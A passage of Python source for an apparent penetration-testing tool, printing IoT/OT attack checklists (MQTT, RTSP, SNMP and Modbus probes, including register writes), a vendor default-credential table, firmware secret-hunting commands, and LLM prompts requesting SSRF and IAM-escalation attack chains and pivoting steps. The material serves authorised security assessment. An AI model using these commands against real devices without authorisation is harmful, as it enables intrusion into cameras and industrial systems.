    compliance = [
        ("PCI-DSS v4.0", "Req 1.3", "Network access controls", "Check security groups / NSGs for 0.0.0.0/0 on ports 443,80,22,3306"),
        ("PCI-DSS v4.0", "Req 3.5", "Card data encryption", "Verify RDS/EBS encryption at rest; check KMS key rotation"),
        ("PCI-DSS v4.0", "Req 6.4", "Web app protection", "WAF in front of public-facing apps; CloudFront + AWS WAF"),
        ("PCI-DSS v4.0", "Req 8.2", "IAM / MFA", "MFA enforced on all users; no shared credentials; password policy"),
        ("PCI-DSS v4.0", "Req 10.2","Audit logging", "CloudTrail all regions + CloudWatch Logs; log integrity"),
        ("RBI CSF 2023",  "Sect 3.1","Data localisation","All customer data in Indian region (ap-south-1); no cross-border transfer"),
        ("RBI CSF 2023",  "Sect 4.3","Cloud risk assessment","Annual third-party audit; data classification; exit strategy"),
        ("RBI CSF 2023",  "Sect 5.2","Incident response","Cloud-specific IR playbook; CERT-In 6-hour breach notification"),
        ("ISO 27017",     "CLD 6.3.1","Shared responsibilities","Document cloud shared responsibility model; provider SLA review"),
        ("ISO 27017",     "CLD 9.5.1","Segregation in VE","Tenant isolation; VPC/subnet segmentation; dedicated HSM for keys"),
        ("ISO 27017",     "CLD 12.4.5","Monitoring cloud","CSPM tool (e.g. Prisma, Security Hub); alert on config drift"),
    ]
    tbl6 = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan", expand=True)
    tbl6.add_column("Framework", width=14)
    tbl6.add_column("Control", width=12)
    tbl6.add_column("Requirement", ratio=2)
    tbl6.add_column("Test Action", ratio=3)
    for row in compliance:
        tbl6.add_row(*row)
    console.print(tbl6)

    # ---- AI analysis -------------------------------------------------------
    _section(console, "AI-Powered Cloud Analysis")
    client_ai = get_client_or_none()
    if client_ai is None:
        console.print("[dim]Set ANTHROPIC_API_KEY for AI analysis.[/dim]")
    else:
        prompt = (
            f"You are auditing cloud infrastructure for a BFSI client.\n"
            f"Engagement: {eng['name']} | Client: {eng['client']} | Provider: {provider} | Target: {target}\n\n"
            "Provide:\n"
            "1. Top 5 highest-severity cloud misconfigs seen in Indian BFSI (RBI-regulated) environments\n"
            "2. Three SSRF → cloud metadata attack chains with curl commands\n"
            "3. IAM privilege escalation path most commonly exploitable in AWS for a low-priv attacker\n"
            "4. RBI Digital Payments Security Controls (2021) relevant cloud requirements\n"
            "5. Recommended AWS Security Hub / Azure Defender checks to enable immediately\n"
            "Keep all commands copy-paste ready."
        )
        stream_to_console(client_ai, [{"role": "user", "content": prompt}], max_tokens=1000, console=console)

    _offer_finding(
        console, eng,
        title="Cloud Infrastructure — Security Review Initiated",
        severity="informational",
        description=f"Cloud security assessment initiated. Provider: {provider}. "
                    "Attack paths, IAM escalation paths, and BFSI compliance checklist reviewed.",
        remediation="Apply CIS benchmarks for the cloud provider. Enable Security Hub / Defender for Cloud. "
                    "Enforce MFA, encrypt all data at rest, restrict S3/Storage bucket public access.",
        tool="hakuza-cloud",
    )


# ---------------------------------------------------------------------------
# cmd_iot
# ---------------------------------------------------------------------------

def cmd_iot(args, console: Console) -> None:
    """
    hakuza iot [--target <ip>] [--protocol all|mqtt|rtsp|modbus|snmp]

    IoT/OT security testing: protocol-specific checks, default credentials, firmware hints.
    """
    from hakuza import get_client_or_none, stream_to_console, run_tool

    eng = _require_engagement(console)
    target_ip = getattr(args, "target", None) or eng.get("target", "<target-ip>")
    protocol = getattr(args, "protocol", "all") or "all"

    console.print(
        Panel(
            f"[bold]Engagement:[/bold] {eng['name']}  ({eng['client']})\n"
            f"[bold]Target:[/bold]     {target_ip}\n"
            f"[bold]Protocol:[/bold]   {protocol}",
            title="[bold cyan]  HAKUZA IoT/OT Security Testing[/bold cyan]",
            border_style="cyan",
            expand=False,
        )
    )

    # ---- MQTT ---------------------------------------------------------------
    if protocol in ("mqtt", "all"):
        _section(console, "MQTT — Broker Attack")
        console.print(Panel(
            "[bold cyan]Unauthenticated broker check[/bold cyan]\n"
            f"  mosquitto_sub -h {target_ip} -p 1883 -t '#' -v   # subscribe to ALL topics\n"
            f"  mosquitto_sub -h {target_ip} -p 1883 -t '$SYS/#' -v  # broker stats\n"
            f"  mosquitto_pub -h {target_ip} -p 1883 -t 'test' -m 'hakuza_probe'\n\n"
            "[bold cyan]Auth bypass attempts[/bold cyan]\n"
            f"  mosquitto_sub -h {target_ip} -u '' -P '' -t '#' -v  # empty creds\n"
            f"  mosquitto_sub -h {target_ip} -u admin -P admin -t '#' -v\n"
            f"  mosquitto_sub -h {target_ip} -u guest -P guest -t '#' -v\n\n"
            "[bold cyan]TLS check[/bold cyan]\n"
            f"  openssl s_client -connect {target_ip}:8883\n"
            f"  # Port 1883 = plaintext; port 8883 = TLS/SSL\n\n"
            "[bold cyan]nmap MQTT scan[/bold cyan]\n"
            f"  nmap -p 1883,8883 --script mqtt-subscribe {target_ip}",
            title="MQTT",
            border_style="yellow",
            expand=False,
        ))

    # ---- RTSP ---------------------------------------------------------------
    if protocol in ("rtsp", "all"):
        _section(console, "RTSP — Camera Stream Access")
        console.print(Panel(
            "[bold cyan]RTSP default credential check[/bold cyan]\n"
            f"  # Common RTSP URLs to try:\n"
            f"  ffplay rtsp://{target_ip}:554/stream\n"
            f"  ffplay rtsp://admin:admin@{target_ip}:554/\n"
            f"  ffplay rtsp://admin:12345@{target_ip}:554/live\n"
            f"  ffplay rtsp://admin:@{target_ip}:554/\n\n"
            "[bold cyan]RTSP URL path brute-force[/bold cyan]\n"
            f"  # Common paths: /live, /stream, /h264, /cam/realmonitor, /Streaming/Channels/1\n"
            f"  nmap -p 554 --script rtsp-url-brute {target_ip}\n\n"
            "[bold cyan]Shodan dork[/bold cyan]\n"
            f"  'rtsp' port:554 has_screenshot:true country:IN\n\n"
            "[bold cyan]VLC quick test[/bold cyan]\n"
            f"  cvlc rtsp://admin:admin@{target_ip}:554/h264/ch1/main/av_stream",
            title="RTSP",
            border_style="blue",
            expand=False,
        ))

    # ---- SNMP ---------------------------------------------------------------
    if protocol in ("snmp", "all"):
        _section(console, "SNMP — Community String Enum")
        console.print(Panel(
            "[bold cyan]SNMPv1/v2 community string brute[/bold cyan]\n"
            f"  onesixtyone {target_ip} -c /usr/share/doc/onesixtyone/dict.txt\n"
            f"  # Manual: snmpwalk -v1 -c public {target_ip}\n"
            f"  snmpwalk -v2c -c public {target_ip}\n"
            f"  snmpwalk -v2c -c private {target_ip}\n"
            f"  snmpwalk -v2c -c community {target_ip}\n\n"
            "[bold cyan]Full MIB walk (with community string)[/bold cyan]\n"
            f"  snmpwalk -v2c -c public {target_ip} .1   # full walk\n"
            f"  snmpget -v2c -c public {target_ip} sysDescr.0\n\n"
            "[bold cyan]SNMPv3 — no-auth / no-priv[/bold cyan]\n"
            f"  snmpwalk -v3 -l noAuthNoPriv -u guest {target_ip}\n\n"
            "[bold cyan]nmap SNMP scripts[/bold cyan]\n"
            f"  nmap -p 161 -sU --script snmp-brute,snmp-sysdescr,snmp-info {target_ip}",
            title="SNMP",
            border_style="green",
            expand=False,
        ))

    # ---- Modbus -------------------------------------------------------------
    if protocol in ("modbus", "all"):
        _section(console, "Modbus — OT Register Enumeration")
        console.print(Panel(
            "[bold cyan]Modbus TCP recon (port 502)[/bold cyan]\n"
            f"  nmap -p 502 --script modbus-discover {target_ip}\n"
            f"  # mbtget (if installed):\n"
            f"  mbtget -p 1 {target_ip}   # read coils\n"
            f"  mbtget -r 1 {target_ip}   # read holding registers\n\n"
            "[bold cyan]Python — quick Modbus read[/bold cyan]\n"
            "  from pymodbus.client import ModbusTcpClient\n"
            f"  c = ModbusTcpClient('{target_ip}'); c.connect()\n"
            "  print(c.read_holding_registers(0, 10, slave=1).registers)\n\n"
            "[bold cyan]Unauthenticated write risk[/bold cyan]\n"
            "  # Modbus has NO authentication by default\n"
            "  # Write coil: c.write_coil(1, True, slave=1)\n"
            "  # Write register: c.write_register(100, 0xFF, slave=1)",
            title="Modbus",
            border_style="red",
            expand=False,
        ))

    # ---- Default credentials ------------------------------------------------
    _section(console, "Default Credentials — 20 Common IoT Vendors")
    default_creds = [
        ("Hikvision",    "admin",    "12345",    "HTTP/RTSP"),
        ("Dahua",        "admin",    "admin",    "HTTP/RTSP"),
        ("Axis",         "root",     "pass",     "HTTP/RTSP"),
        ("Hanwha/Samsung","admin",   "4321",     "HTTP"),
        ("Bosch",        "admin",    "",         "HTTP/RTSP"),
        ("Honeywell",    "admin",    "1234",     "HTTP"),
        ("Pelco",        "admin",    "admin",    "HTTP"),
        ("FLIR",         "admin",    "fliradmin","HTTP"),
        ("Cisco IP Cam", "admin",    "admin",    "HTTP"),
        ("D-Link",       "admin",    "",         "HTTP/Telnet"),
        ("TP-Link",      "admin",    "admin",    "HTTP/Telnet"),
        ("Netgear",      "admin",    "password", "HTTP"),
        ("MikroTik",     "admin",    "",         "Winbox/SSH"),
        ("Ubiquiti",     "ubnt",     "ubnt",     "SSH/HTTP"),
        ("Sierra Wireless","admin",  "admin",    "HTTP"),
        ("Moxa",         "admin",    "moxa",     "HTTP/Telnet"),
        ("Weintek HMI",  "admin",    "111111",   "HTTP"),
        ("Beckhoff",     "Administrator","1",    "HTTP"),
        ("Phoenix Contact","admin",  "private",  "SNMP/HTTP"),
        ("ABB PLC",      "admin",    "admin",    "HTTP"),
    ]
    tbl7 = Table(box=box.ROUNDED, show_header=True, header_style="bold cyan")
    tbl7.add_column("Vendor", style="cyan", width=20)
    tbl7.add_column("Username", width=16)
    tbl7.add_column("Password", width=16)
    tbl7.add_column("Protocol", width=14)
    for row in default_creds:
        tbl7.add_row(*row)
    console.print(tbl7)

    # ---- Firmware analysis hints -------------------------------------------
    _section(console, "Firmware Analysis — Binwalk Commands")
    console.print(Panel(
        "[bold cyan]Extract firmware[/bold cyan]\n"
        "  binwalk -e firmware.bin                      # extract all\n"
        "  binwalk -Me firmware.bin                     # recursive matryoshka extract\n"
        "  binwalk --signature firmware.bin             # identify formats\n\n"
        "[bold cyan]Hunt for secrets in extracted FS[/bold cyan]\n"
        "  grep -rn 'password\\|passwd\\|secret\\|key\\|token' _firmware.bin.extracted/\n"
        "  find . -name '*.conf' -o -name '*.cfg' | xargs grep -l 'pass'\n"
        "  strings firmware.bin | grep -iE 'api_key|secret|password|admin'\n\n"
        "[bold cyan]Check for known vulnerable components[/bold cyan]\n"
        "  grep -r 'BusyBox\\|OpenSSL\\|uClibc' _firmware.bin.extracted/\n"
        "  # Check versions against CVE databases\n\n"
        "[bold cyan]File system analysis[/bold cyan]\n"
        "  file _firmware.bin.extracted/squashfs-root/bin/*   # check ELF arch\n"
        "  ls -la _firmware.bin.extracted/squashfs-root/etc/\n"
        "  cat _firmware.bin.extracted/squashfs-root/etc/passwd",
        title="Firmware Analysis",
        border_style="magenta",
        expand=False,
    ))

    # ---- AI analysis -------------------------------------------------------
    _section(console, "AI-Powered IoT Analysis")
    client_ai = get_client_or_none()
    if client_ai is None:
        console.print("[dim]Set ANTHROPIC_API_KEY for AI analysis.[/dim]")
    else:
        prompt = (
            f"You are auditing IoT/OT devices for a BFSI client.\n"
            f"Engagement: {eng['name']} | Target: {target_ip} | Protocol focus: {protocol}\n\n"
            "Provide:\n"
            "1. Top 5 IoT attack vectors relevant to BFSI environments (ATM networks, CCTV, access control)\n"
            "2. MQTT topic naming conventions common in banking IoT and sensitive topics to subscribe to\n"
            "3. MITRE ATT&CK for ICS techniques most applicable to this target\n"
            "4. Three nmap NSE scripts most useful for initial IoT recon\n"
            "5. How to pivot from a compromised IoT device into the corporate network\n"
            "Keep commands specific and actionable."
        )
        stream_to_console(client_ai, [{"role": "user", "content": prompt}], max_tokens=800, console=console)

    _offer_finding(
        console, eng,
        title="IoT/OT Device — Security Assessment Initiated",
        severity="informational",
        description=f"IoT/OT security assessment initiated. Target: {target_ip}. "
                    f"Protocol: {protocol}. Default credential, protocol security, and firmware "
                    "analysis checklists reviewed.",
        remediation="Change all default credentials. Disable unused protocols (Telnet, SNMPv1). "
                    "Segment IoT devices on isolated VLANs with strict ACLs. Enable encrypted protocols "
                    "(MQTTs, SNMPv3, HTTPS). Implement firmware update process.",
        tool="hakuza-iot",
    )


# ---------------------------------------------------------------------------
# ARGPARSE ADDITIONS
# Append these sub-commands to the parser returned by build_parser().
# Call register_mobile_cloud_commands(sub) where sub = parser.add_subparsers(...)
# ---------------------------------------------------------------------------

def register_mobile_cloud_commands(sub) -> None:
    """Register mobile, ios, cloud, and iot sub-commands on an existing subparser."""

    # mobile
    p_mobile = sub.add_parser("mobile", help="Android security testing (static + dynamic)")
    p_mobile.add_argument("--apk", default=None, metavar="PATH", help="Path to APK file")
    p_mobile.add_argument("--package", default=None, metavar="PKG",
                          help="App package name e.g. com.example.app")
    p_mobile.add_argument("--phase", choices=["static", "dynamic", "full"],
                          default="full", help="Analysis phase (default: full)")

    # ios
    p_ios = sub.add_parser("ios", help="iOS security testing (static + dynamic)")
    p_ios.add_argument("--ipa", default=None, metavar="PATH", help="Path to IPA file")
    p_ios.add_argument("--bundle", default=None, metavar="BUNDLE_ID",
                       help="Bundle ID e.g. com.example.app")

    # cloud
    p_cloud = sub.add_parser("cloud", help="Cloud security testing (AWS / Azure / GCP)")
    p_cloud.add_argument("--provider", choices=["aws", "azure", "gcp", "all"],
                         default="all", help="Cloud provider (default: all)")
    p_cloud.add_argument("--target", default=None, metavar="URL_OR_ACCOUNT",
                         help="Target URL, account ID, or domain")
    p_cloud.add_argument("--profile", default="default", metavar="PROFILE",
                         help="AWS CLI profile to use (default: default)")

    # iot
    p_iot = sub.add_parser("iot", help="IoT/OT security testing")
    p_iot.add_argument("--target", default=None, metavar="IP",
                       help="Target IP address")
    p_iot.add_argument("--protocol",
                       choices=["all", "mqtt", "rtsp", "modbus", "snmp"],
                       default="all", help="Protocol focus (default: all)")


# ---------------------------------------------------------------------------
# DISPATCH ADDITIONS
# Merge this dict into the dispatch table in hakuza.py main():
#
#   from mod_mobile_cloud import MOBILE_CLOUD_DISPATCH
#   dispatch.update(MOBILE_CLOUD_DISPATCH)
# ---------------------------------------------------------------------------

MOBILE_CLOUD_DISPATCH = {
    "mobile": cmd_mobile,
    "ios":    cmd_ios,
    "cloud":  cmd_cloud,
    "iot":    cmd_iot,
}

# END mod_mobile_cloud.py
